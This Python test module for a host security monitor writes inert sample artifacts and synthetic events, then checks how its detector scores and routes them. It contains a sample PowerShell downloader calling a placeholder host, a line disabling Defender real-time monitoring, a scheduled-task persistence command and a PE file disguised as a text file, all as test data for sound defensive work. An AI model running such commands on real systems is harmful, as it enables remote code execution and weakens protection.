from __future__ import annotations

from pathlib import Path
from tempfile import TemporaryDirectory
from typing import Any
import os
import struct

from .analysis import RuleEngine
from .config import AppConfig
from .events import ActionDecision, RuleAssessment, SecurityEvent
from .llm import LLMRouter
from .policy import PolicyEngine
from .sensors import FileScanner


RUBRIC = [
    "Hidden executable content is detected even when the filename looks harmless",
    "Suspicious script primitives route to high-risk handling without executing the script",
    "Benign low-signal files do not get escalated to deep scan",
    "Process, persistence, network, and posture detections produce expected high-signal actions",
    "Every escalated case returns safe manual controls instead of destructive remediation",
]


def run_protection_verification(
    config: AppConfig,
    rules: RuleEngine,
    router: LLMRouter,
    policy: PolicyEngine,
    use_llm: bool = False,
    keep_artifacts: Path | None = None,
) -> dict[str, Any]:
    if keep_artifacts is not None:
        keep_artifacts.mkdir(parents=True, exist_ok=True)
        return _run_cases(keep_artifacts, True, config, rules, router, policy, use_llm)

    with TemporaryDirectory(prefix="monarch-security-lab-") as directory:
        return _run_cases(Path(directory), False, config, rules, router, policy, use_llm)


def _run_cases(
    lab_root: Path,
    artifacts_retained: bool,
    config: AppConfig,
    rules: RuleEngine,
    router: LLMRouter,
    policy: PolicyEngine,
    use_llm: bool,
) -> dict[str, Any]:
    artifacts = _write_lab_artifacts(lab_root)
    cases = [
        _file_case(
            "hidden_pe_disguised_as_text",
            artifacts["hidden_pe"],
            config,
            rules,
            router,
            policy,
            use_llm,
            min_score=35,
            expected_routes={"deep_scan", "llm"},
            required_reason="PE executable content is hidden behind a non-PE extension",
            required_control="Defender",
        ),
        _file_case(
            "suspicious_powershell_downloader",
            artifacts["script"],
            config,
            rules,
            router,
            policy,
            use_llm,
            min_score=65,
            expected_routes={"llm"},
            required_reason="Script contains suspicious primitives",
            required_control="script",
        ),
        _file_case(
            "benign_text_noise_floor",
            artifacts["benign"],
            config,
            rules,
            router,
            policy,
            use_llm,
            max_score=20,
            forbidden_routes={"deep_scan", "llm"},
        ),
        _event_case(
            "office_spawned_encoded_powershell",
            _office_powershell_event(),
            rules,
            router,
            policy,
            use_llm,
            min_score=85,
            expected_routes={"llm"},
            expected_actions={"ask_user", "quarantine_suggest", "block_suggest"},
            required_control="process tree",
        ),
        _event_case(
            "download_run_key_persistence",
            _download_persistence_event(),
            rules,
            router,
            policy,
            use_llm,
            min_score=65,
            expected_routes={"llm"},
            expected_actions={"ask_user", "quarantine_suggest", "block_suggest"},
            required_control="persistence entry",
        ),
        _event_case(
            "exposed_rdp_listener",
            _rdp_listener_event(),
            rules,
            router,
            policy,
            use_llm,
            min_score=35,
            expected_routes={"deep_scan"},
            expected_actions={"deep_scan"},
            required_control="listener",
        ),
        _event_case(
            "suspicious_process_public_c2_port",
            _external_c2_event(),
            rules,
            router,
            policy,
            use_llm,
            min_score=65,
            expected_routes={"llm"},
            expected_actions={"ask_user", "quarantine_suggest", "block_suggest"},
            required_control="public remote endpoint",
        ),
        _event_case(
            "defender_realtime_disabled",
            _disabled_defender_event(),
            rules,
            router,
            policy,
            use_llm,
            min_score=65,
            expected_routes={"llm"},
            expected_actions={"ask_user", "quarantine_suggest", "block_suggest"},
            required_control="Defender",
        ),
    ]
    passed = all(case["passed"] for case in cases)
    failed = [case["name"] for case in cases if not case["passed"]]
    return {
        "passed": passed,
        "failed": failed,
        "case_count": len(cases),
        "rubric": RUBRIC,
        "use_llm": use_llm,
        "artifacts_retained": artifacts_retained,
        "artifact_root": str(lab_root) if artifacts_retained else None,
        "note": "Verification samples are inert and are scanned, not executed.",
        "cases": cases,
    }


def _write_lab_artifacts(root: Path) -> dict[str, Path]:
    sample_root = root / "Downloads"
    sample_root.mkdir(parents=True, exist_ok=True)

    hidden_pe = sample_root / "invoice.txt"
    hidden_pe.write_bytes(_minimal_pe())
    _try_write_zone_identifier(hidden_pe)

    script = sample_root / "update.ps1"
    script.write_text(
        "IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/a.ps1')\n"
        "$decoded=[Convert]::FromBase64String('"
        + ("A" * 128)
        + "')\n"
        "Set-MpPreference -DisableRealtimeMonitoring $true\n"
        "schtasks /Create /SC ONLOGON /TN Updater /TR calc.exe\n",
        encoding="utf-8",
    )
    _try_write_zone_identifier(script)

    benign = sample_root / "notes.txt"
    benign.write_text("Meeting notes. Nothing executable here.\n", encoding="utf-8")

    return {"hidden_pe": hidden_pe, "script": script, "benign": benign}


def _file_case(
    name: str,
    path: Path,
    config: AppConfig,
    rules: RuleEngine,
    router: LLMRouter,
    policy: PolicyEngine,
    use_llm: bool,
    min_score: int | None = None,
    max_score: int | None = None,
    expected_routes: set[str] | None = None,
    forbidden_routes: set[str] | None = None,
    expected_actions: set[str] | None = None,
    required_reason: str | None = None,
    required_control: str | None = None,
) -> dict[str, Any]:
    scanner = FileScanner(config.files)
    event = scanner.inspect(path)
    return _evaluate_case(
        name,
        rules.assess(event),
        _decide(event, rules, router, policy, use_llm),
        min_score=min_score,
        max_score=max_score,
        expected_routes=expected_routes,
        forbidden_routes=forbidden_routes,
        expected_actions=expected_actions,
        required_reason=required_reason,
        required_control=required_control,
    )


def _event_case(
    name: str,
    event: SecurityEvent,
    rules: RuleEngine,
    router: LLMRouter,
    policy: PolicyEngine,
    use_llm: bool,
    min_score: int | None = None,
    max_score: int | None = None,
    expected_routes: set[str] | None = None,
    forbidden_routes: set[str] | None = None,
    expected_actions: set[str] | None = None,
    required_reason: str | None = None,
    required_control: str | None = None,
) -> dict[str, Any]:
    return _evaluate_case(
        name,
        rules.assess(event),
        _decide(event, rules, router, policy, use_llm),
        min_score=min_score,
        max_score=max_score,
        expected_routes=expected_routes,
        forbidden_routes=forbidden_routes,
        expected_actions=expected_actions,
        required_reason=required_reason,
        required_control=required_control,
    )


def _decide(
    event: SecurityEvent,
    rules: RuleEngine,
    router: LLMRouter,
    policy: PolicyEngine,
    use_llm: bool,
) -> ActionDecision:
    assessment = rules.assess(event)
    if use_llm:
        return router.decide(assessment)
    return policy.local_decision(assessment)


def _evaluate_case(
    name: str,
    assessment: RuleAssessment,
    decision: ActionDecision,
    min_score: int | None = None,
    max_score: int | None = None,
    expected_routes: set[str] | None = None,
    forbidden_routes: set[str] | None = None,
    expected_actions: set[str] | None = None,
    required_reason: str | None = None,
    required_control: str | None = None,
) -> dict[str, Any]:
    failures: list[str] = []
    if min_score is not None and assessment.score < min_score:
        failures.append(f"score {assessment.score} is below expected minimum {min_score}")
    if max_score is not None and assessment.score > max_score:
        failures.append(f"score {assessment.score} is above expected maximum {max_score}")
    if expected_routes is not None and assessment.route not in expected_routes:
        failures.append(
            f"route {assessment.route!r} is not one of {sorted(expected_routes)}"
        )
    if forbidden_routes is not None and assessment.route in forbidden_routes:
        failures.append(f"route {assessment.route!r} should not be used")
    if expected_actions is not None and decision.action not in expected_actions:
        failures.append(
            f"action {decision.action!r} is not one of {sorted(expected_actions)}"
        )
    if required_reason and not _contains(assessment.reasons, required_reason):
        failures.append(f"missing expected reason containing {required_reason!r}")
    if required_control and not _contains(decision.controls, required_control):
        failures.append(f"missing expected control containing {required_control!r}")

    return {
        "name": name,
        "passed": not failures,
        "failures": failures,
        "score": assessment.score,
        "severity": assessment.severity,
        "route": assessment.route,
        "action": decision.action,
        "source": decision.source,
        "subject": assessment.event.subject,
        "reasons": assessment.reasons,
        "controls": decision.controls,
    }


def _contains(values: list[str], needle: str) -> bool:
    lowered = needle.lower()
    return any(lowered in value.lower() for value in values)


def _try_write_zone_identifier(path: Path) -> bool:
    if os.name != "nt":
        return False
    try:
        with open(f"{path}:Zone.Identifier", "w", encoding="utf-8") as handle:
            handle.write("[ZoneTransfer]\nZoneId=3\n")
    except OSError:
        return False
    return True


def _minimal_pe() -> bytes:
    data = bytearray(1024)
    data[:2] = b"MZ"
    pe_offset = 0x80
    struct.pack_into("<I", data, 0x3C, pe_offset)
    data[pe_offset : pe_offset + 4] = b"PE\x00\x00"
    struct.pack_into(
        "<HHIIIHH",
        data,
        pe_offset + 4,
        0x8664,
        1,
        0,
        0,
        0,
        0xF0,
        0,
    )
    optional_offset = pe_offset + 24
    struct.pack_into("<H", data, optional_offset, 0x20B)
    struct.pack_into("<H", data, optional_offset + 68, 3)
    section_offset = optional_offset + 0xF0
    data[section_offset : section_offset + 8] = b".text\x00\x00\x00"
    struct.pack_into("<I", data, section_offset + 16, 64)
    struct.pack_into("<I", data, section_offset + 20, 0x300)
    data[0x300 : 0x340] = b"\x90" * 64
    return bytes(data)


def _office_powershell_event() -> SecurityEvent:
    return SecurityEvent(
        kind="process.started",
        source="verification_lab",
        subject="powershell.exe",
        facts={
            "pid": 4242,
            "name": "powershell.exe",
            "exe": r"C:\Users\Example\Downloads\update.exe",
            "cmdline": ["powershell.exe", "-EncodedCommand", "AAAA"],
            "parent_name": "WINWORD.EXE",
        },
    )


def _download_persistence_event() -> SecurityEvent:
    return SecurityEvent(
        kind="persistence.entry_added",
        source="verification_lab",
        subject="HKCU Run Updater",
        facts={
            "kind": "run_key",
            "name": "Updater",
            "value": r"C:\Users\Example\Downloads\update.exe -EncodedCommand AAAA",
            "extension": ".exe",
        },
    )


def _rdp_listener_event() -> SecurityEvent:
    return SecurityEvent(
        kind="network.listener_seen",
        source="verification_lab",
        subject="0.0.0.0:3389",
        facts={
            "local_address": "0.0.0.0",
            "local_port": 3389,
            "owning_process": 123,
            "process_name": "svchost.exe",
        },
    )


def _external_c2_event() -> SecurityEvent:
    return SecurityEvent(
        kind="network.connection_seen",
        source="verification_lab",
        subject="8.8.8.8:4444",
        facts={
            "local_address": "192.168.1.10",
            "local_port": 51515,
            "remote_address": "8.8.8.8",
            "remote_port": 4444,
            "remote_scope": "public",
            "remote_is_public": True,
            "owning_process": 4242,
            "process_name": "powershell.exe",
        },
    )


def _disabled_defender_event() -> SecurityEvent:
    return SecurityEvent(
        kind="security.posture_changed",
        source="verification_lab",
        subject="Microsoft Defender",
        facts={
            "kind": "defender_status",
            "subject": "Microsoft Defender",
            "antivirus_enabled": False,
            "real_time_protection_enabled": False,
            "behavior_monitor_enabled": False,
            "ioav_protection_enabled": False,
            "antispyware_enabled": False,
        },
    )
